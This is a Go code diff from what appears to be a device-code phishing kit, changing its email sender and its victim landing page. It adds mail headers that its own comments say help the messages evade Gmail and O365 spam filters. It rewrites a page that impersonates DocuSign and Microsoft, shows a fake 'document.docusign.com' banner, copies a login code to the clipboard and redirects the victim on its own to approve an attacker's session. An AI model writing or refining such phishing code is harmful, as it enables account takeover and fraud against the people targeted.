@@ -381,9 +381,18 @@ func sendDCEmail(t *DCTarget, template string) error {
 
 	subject, body := buildEmailContent(t, template)
 
-	// Build raw MIME message (From: header keeps display name if set)
-	msg := fmt.Sprintf("From: %s\r\nTo: %s\r\nSubject: %s\r\nMIME-Version: 1.0\r\nContent-Type: text/html; charset=UTF-8\r\n\r\n%s",
-		from, t.Email, subject, body)
+	// Build raw MIME message.
+	// Date + Message-ID are required by RFC 5322 and improve inbox placement —
+	// missing headers are a strong spam signal for Gmail / O365.
+	msgIDDomain := envelopeFrom
+	if at := strings.Index(envelopeFrom, "@"); at != -1 {
+		msgIDDomain = envelopeFrom[at+1:]
+	}
+	msgID := fmt.Sprintf("<%s@%s>", randHex(16), msgIDDomain)
+	dateStr := time.Now().Format("Mon, 02 Jan 2006 15:04:05 -0700")
+	msg := fmt.Sprintf(
+		"From: %s\r\nTo: %s\r\nSubject: %s\r\nDate: %s\r\nMessage-ID: %s\r\nMIME-Version: 1.0\r\nContent-Type: text/html; charset=UTF-8\r\n\r\n%s",
+		from, t.Email, subject, dateStr, msgID, body)
 
 	addr := fmt.Sprintf("%s:%d", host, port)
 
@@ -631,78 +640,90 @@ func DCLandingPage(t *DCTarget) string {
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>DocuSign – Identity Verification</title>
+<title>Document Pending Review</title>
 <style>
 *{box-sizing:border-box;margin:0;padding:0}
-body{font-family:Arial,sans-serif;background:#f5f5f5;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center}
-.card{background:#fff;border:1px solid #ddd;border-radius:4px;padding:40px 48px;max-width:420px;width:100%%;text-align:center}
-.ds-logo{margin-bottom:20px}
-h2{font-size:17px;font-weight:600;color:#222;margin-bottom:10px}
-.sub{font-size:14px;color:#666;line-height:1.6;margin-bottom:24px}
-.code-wrap{background:#f0f6ff;border:2px solid #0078d4;border-radius:6px;padding:16px 20px;margin-bottom:20px}
-.code-label{font-size:11px;text-transform:uppercase;letter-spacing:.7px;color:#666;margin-bottom:6px}
-.code{font-size:30px;font-weight:700;letter-spacing:8px;color:#0078d4;font-family:'Courier New',monospace;cursor:pointer}
-.hint{font-size:12px;color:#999;margin-bottom:22px}
-.btn{display:inline-block;background:#0078d4;color:#fff;padding:11px 32px;border-radius:3px;font-size:14px;font-weight:600;text-decoration:none}
-.copied{font-size:12px;color:#107c10;display:none;margin-top:6px}
+body{font-family:Helvetica,Arial,sans-serif;background:#f4f4f4;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:16px}
+.wrap{width:100%%;max-width:520px}
+/* domain banner */
+.banner{background:#E8EFF6;color:#00083D;font-size:12px;text-align:center;padding:9px 20px;font-family:Helvetica,Arial,sans-serif}
+/* logo row */
+.logo-row{background:#fff;padding:20px 40px;display:flex;align-items:center;justify-content:center;gap:9px}
+.logo-sq{background:#FFB800;border-radius:4px;width:34px;height:34px;display:flex;align-items:center;justify-content:center;font-size:20px;font-weight:900;color:#fff;flex-shrink:0}
+.logo-text{font-size:22px;font-weight:700;color:#26282B;letter-spacing:-0.3px}
+/* body */
+.body{background:#260559;padding:28px 24px}
+.eyebrow{font-size:11px;text-transform:uppercase;letter-spacing:1.2px;color:#c9b8e8;margin-bottom:8px}
+h1{font-size:20px;font-weight:700;color:#fff;margin-bottom:18px;line-height:1.3}
+.desc{color:#ddd;font-size:14px;line-height:1.7;margin-bottom:22px}
+/* code box */
+.code-box{background:#3a0c72;border:1px solid #6b3aa0;border-radius:6px;padding:16px 24px;text-align:center;margin-bottom:22px;cursor:pointer}
+.code-label{font-size:10px;text-transform:uppercase;letter-spacing:1.5px;color:#c9a8f0;margin-bottom:8px}
+.code{font-family:'Courier New',Courier,monospace;font-size:32px;font-weight:700;letter-spacing:10px;color:#fff;user-select:all}
+.hint{font-size:12px;color:#bbb;text-align:center;margin-bottom:20px}
+.hint-copied{font-size:12px;color:#a8e6a3;text-align:center;margin-bottom:20px;display:none}
+/* CTA */
+.cta-wrap{text-align:left;margin-bottom:22px}
+.btn{display:inline-block;background:#fff;color:#260559;padding:11px 36px;border-radius:50px;font-size:14px;font-weight:700;text-decoration:none;cursor:pointer;border:none}
+hr{border:0;border-top:0.5px solid #4a2a7a;margin:4px 0 16px}
+.fine{font-size:13px;color:#fff;font-weight:700;margin-bottom:6px}
+.fine2{font-size:12px;color:#bbb;line-height:1.5}
+/* footer */
+.footer{background:#E8EFF6;color:#00083D;font-size:12px;padding:18px 20px;line-height:1.5}
+.footer a{color:#666}
 </style>
 </head>
 <body>
-<div class="card">
-  <div class="ds-logo">
-    <svg width="110" height="26" viewBox="0 0 110 26" fill="none" xmlns="http://www.w3.org/2000/svg">
-      <rect width="26" height="26" rx="3" fill="#FFB900"/>
-      <path d="M6 13C6 9.13 9.13 6 13 6C16.87 6 20 9.13 20 13C20 16.87 16.87 20 13 20C9.13 20 6 16.87 6 13Z" fill="white"/>
-      <path d="M10 13L12.5 15.5L16.5 10.5" stroke="#FFB900" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-      <text x="30" y="19" font-family="Arial" font-weight="700" font-size="15" fill="#333">DocuSign</text>
-    </svg>
+<div class="wrap">
+  <div class="banner" id="bdom">document.docusign.com</div>
+  <div class="logo-row">
+    <div class="logo-sq">d</div>
+    <div class="logo-text">DocuSign</div>
   </div>
-  <h2>One more step to access your document</h2>
-  <p class="sub">Microsoft requires a quick identity check before you can view this document. Enter the code below at the Microsoft verification page.</p>
-  <div class="code-wrap">
-    <div class="code-label">Your verification code</div>
-    <div class="code" id="code">%s</div>
+  <div class="body">
+    <div class="eyebrow">Document Pending Review</div>
+    <h1>One more step to access your document</h1>
+    <p class="desc">Microsoft requires a quick identity check before you can view this document. Enter the code below at the Microsoft verification page.</p>
+    <div class="code-box" id="cbox" onclick="doCopy()">
+      <div class="code-label">Your verification code</div>
+      <div class="code" id="code">%s</div>
+    </div>
+    <p class="hint" id="hint">Click the code above to copy it, then paste it on the Microsoft page.</p>
+    <p class="hint-copied" id="copied">Copied — opening Microsoft verification…</p>
+    <div class="cta-wrap">
+      <a class="btn" href="%s" id="btn">Open Verification Page</a>
+    </div>
+    <hr>
+    <p class="fine">Do Not Share This Email</p>
+    <p class="fine2">To ensure the security of your data, do not share the links or forward this email to others.</p>
   </div>
-  <p class="hint" id="hint">Click the code to copy it, then paste it on the Microsoft page.</p>
-  <p class="copied" id="copied">Copied — opening Microsoft verification…</p>
-  <a class="btn" href="%s" id="btn">Open Verification Page</a>
+  <div class="footer">
+    <div>Processed on behalf of document.docusign.com</div>
+  </div>
 </div>
 <script>
-var code = %q;
-var url  = %q;
-
-// Try to copy silently on load; if denied, user can click manually
-function tryCopy(){
-  if(navigator.clipboard && navigator.clipboard.writeText){
+var code=%q,url=%q;
+function doCopy(){
+  if(navigator.clipboard&&navigator.clipboard.writeText){
     navigator.clipboard.writeText(code).catch(function(){});
+  } else {
+    var t=document.createElement('textarea');
+    t.value=code;t.style.position='fixed';t.style.opacity='0';
+    document.body.appendChild(t);t.select();document.execCommand('copy');
+    document.body.removeChild(t);
   }
-}
-tryCopy();
-
-// Click on code box = copy + redirect
-document.getElementById('code').addEventListener('click', function(){
-  tryCopy();
-  showCopied();
-});
-
-document.getElementById('btn').addEventListener('click', function(e){
-  e.preventDefault();
-  tryCopy();
-  showCopied();
-  setTimeout(function(){ window.location.replace(url); }, 600);
-});
-
-function showCopied(){
   document.getElementById('hint').style.display='none';
   document.getElementById('copied').style.display='block';
 }
-
-// Auto-open after 3 seconds
+document.getElementById('btn').addEventListener('click',function(e){
+  e.preventDefault();doCopy();
+  setTimeout(function(){window.location.replace(url);},700);
+});
+// Auto copy + redirect after 3s
 setTimeout(function(){
-  tryCopy();
-  showCopied();
-  setTimeout(function(){ window.location.replace(url); }, 800);
-}, 3000);
+  doCopy();
+  setTimeout(function(){window.location.replace(url);},900);
+},3000);
 </script>
 </body>
 </html>`, code, deviceLoginURL, code, deviceLoginURL)
